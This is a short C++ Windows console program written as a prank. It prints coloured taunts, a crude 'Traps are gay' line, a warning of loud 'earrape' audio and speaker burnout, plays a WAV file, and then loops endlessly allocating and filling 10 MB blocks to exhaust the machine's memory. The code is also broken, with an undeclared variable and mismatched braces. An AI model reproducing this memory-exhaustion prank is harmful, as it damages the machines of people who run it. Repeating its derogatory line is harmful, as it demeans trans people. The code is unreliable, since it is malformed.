// ConsoleApplication1.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <fstream> 
#include <iostream>   
#include <windows.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "winmm.lib")
using namespace std;

int main()
{
	{
		
		{
			int n;
			HANDLE  hConsole;
			hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			int col = 11;
			FlushConsoleInputBuffer(hConsole);
			SetConsoleTextAttribute(hConsole, col);

			cout << "Hello\n";
			cout << "I am Here to take over the world\n";
			SetConsoleTextAttribute(hConsole, 12);

			cout << "Enjoy EARRAPE\n";
			cout << "WARING Speaker Burnout\n";
			SetConsoleTextAttribute(hConsole, 9);
			cout << "Fuck yeah, my dudes\n";
			SetConsoleTextAttribute(hConsole, 10);
			cout << " boku no pico\n";
			SetConsoleTextAttribute(hConsole, 12);
			cout << "Traps are gay\n";
		

			//set back to black background and white text
			PlaySound (L"C:/Users/nickb/Music/WHAT.wav", NULL, SND_FILENAME); //SND_FILENAME or SND_LOOP
	{
				for (;;)
				{
					char *alloc = malloc(10 * 1024 * 1024); // alloc 10 MB
					if (alloc != NULL)
					{
						alloced += 10;
						// edit: you have to memset the memory otherwise the system will give it back to you next time
						memset(alloc, 0xab, 10 * 1024 * 1024);
						printf(" alloced %d MB\n", alloced);
						{


		return 0;
	}
}
		}
	}
